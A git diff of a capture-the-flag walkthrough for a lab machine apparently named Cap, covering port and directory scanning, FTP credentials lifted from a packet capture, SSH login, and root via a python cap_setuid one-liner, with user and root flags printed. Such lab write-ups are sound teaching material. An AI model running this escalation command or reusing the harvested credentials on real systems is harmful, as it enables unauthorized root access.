@@ -13,20 +13,6 @@ Through automated, local enumeration, we learn a system package is incorrectly c
 
 We are using network map scanner with aggressive mode recon for service and version number.
 
-Nmap scan terminal result :
-```
-nmap/nmap -A -T4 -sS -sCV -p- --open -oN nmap/all_tcp.md 10.129.3.102
-Nmap scan report for 10.129.3.102
-Host is up (0.018s latency).
-Not shown: 65532 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Gunicorn
-|_http-server-header: gunicorn
-|_http-title: Security Dashboard
-Device type: general purpose|router
-```
 Nmap scan printscreen result :
 
 <img width="808" height="471" alt="nmapscan" src="https://github.com/user-attachments/assets/fcd4038f-744e-427c-a1ba-344cf0c24edc" />
@@ -36,48 +22,12 @@ Next, we enumerate (fuzzing) the port 80 using tools like **gobuster and ffuf** 
 
 We are using both fuzzing scanner with same fuzzing list to compare the result.
 First we are using FFUF scanner for directory fuzzing with raft-medium-directories list :
-Fuzzing Fuff terminal result :
 
-```
-ffuf -u http://10.129.3.102/FUZZ -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -c -v -o gobuster/ffufdir.md
- :: Method           : GET
- :: URL              : http://10.129.3.102/FUZZ
- :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt
- :: Output file      : gobuster/ffufdir.md
-________________________________________________
-[Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 28ms]
-| URL | http://10.129.3.102/data
-| URL | http://10.129.3.102/ip
-| URL | http://10.129.3.102/capture
-| --> | http://10.129.3.102/data/3
-    * FUZZ: capture
-```
 Fuzzing with FFuf printscreen result :
 
 <img width="1102" height="641" alt="fuffdirscan" src="https://github.com/user-attachments/assets/84e6d7f8-d510-47db-a30a-9348e4ab91b8" />
 
 In second stage we are using Gobuster scanner for directory fuzzing with raft-medium-directories list :
-Fuzzing gobuster terminal result:
-
-```
-gobuster dir -u http://10.129.3.102/ -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20 -o gobuster/gobusterdir.md
-===============================================================
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.129.3.102/
-[+] Wordlist:                /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt
-[+] User Agent:              gobuster/3.8.2
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-data                 (Status: 302) [Size: 208] [--> http://10.129.3.102/]
-ip                   (Status: 200) [Size: 17446]
-capture              (Status: 302) [Size: 220] [--> http://10.129.3.102/data/1]
-Progress: 29999 / 29999 (100.00%)
-===============================================================
-```
 
 Fuzzing gobuster print screen result :
 
@@ -95,8 +45,83 @@ INSTERT IMAGE
   Since FTP is a clear-text protocol, we know there may be credentials captured that we can get. To check this, we set the display filter to “ftp”. Once we set the filter, within the first few packets, we see credentials for the **nathan** user.
 
 <img width="1464" height="848" alt="wireshark" src="https://github.com/user-attachments/assets/352ca591-b42c-421d-b23a-fd6227f064d6" />
-#Inicial acces
-Credentials: Nathan : Buck3tH4TF0RM3!
 
-This Pcap file has username and password for FTP service. Let’s use these credentials to login via SSH and read the user flag.
+# Gaining acces
+We have credentials for user **nathan** 
+```
+Credentials: Nathan : Buck3tH4TF0RM3!
+```
+
+This Pcap file has username and password for FTP service. Let’s try using these credentials to login via SSH and read the first flag.
+
+<img width="667" height="399" alt="ftpdirlogin" src="https://github.com/user-attachments/assets/a276a7b8-4fa9-4148-9f30-4ed3af616539" />
+
+<img width="605" height="205" alt="sshlogindir" src="https://github.com/user-attachments/assets/bcda57a1-d086-4ae8-b982-013bf74428a6" />
+
+```
+nathan@cap:~$ ls -la
+total 28
+drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
+drwxr-xr-x 3 root   root   4096 May 23  2021 ..
+lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
+drwx------ 2 nathan nathan 4096 May 23  2021 .cache
+-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
+-r-------- 1 nathan nathan   33 Mar  8 23:49 user.txt
+nathan@cap:~$ cat user.txt
+***ce3f90fe646c14a033f2cff997f3b5c4***
+
+```
+# Privilege Escalation
+
+Let's find linpeas some any escalation paths.
+
+<img width="917" height="155" alt="suidlinpeas" src="https://github.com/user-attachments/assets/6e2dc037-3842-4525-9f42-870fed7f9033" />
+
+We trying and testing manual !
+
+<img width="882" height="143" alt="capsuid" src="https://github.com/user-attachments/assets/bb3e80e0-b63f-4d90-aa47-47fa378fd060" />
+
+ LinPeas result reveals that ‘cap_setuid’ capability is enabled on python3.8 binary. This simply means, the user has privilege to run this program as root.
+
+https://gtfobins.github.io/gtfobins/python/#capabilities
+```
+nathan@cap:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+
+```
+
+<img width="758" height="365" alt="flag2" src="https://github.com/user-attachments/assets/bdac6f58-f0f2-41a0-9071-1819d9869a8f" />
+
+```
+nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# whoami
+root
+# cd /root/
+# ls -la
+total 36
+drwx------  6 root root 4096 Mar  8 23:49 .
+drwxr-xr-x 20 root root 4096 Jun  1  2021 ..
+lrwxrwxrwx  1 root root    9 May 15  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwxr-xr-x  3 root root 4096 May 23  2021 .cache
+drwxr-xr-x  3 root root 4096 May 23  2021 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+drwx------  2 root root 4096 May 23  2021 .ssh
+lrwxrwxrwx  1 root root    9 May 27  2021 .viminfo -> /dev/null
+-r--------  1 root root   33 Mar  8 23:49 root.txt
+drwxr-xr-x  3 root root 4096 May 23  2021 snap
+# cat root.txt
+1d96b9552d8caefcd6e857075c0cc138
+
+```
+
+We got access to root shell and read the root flag.
 
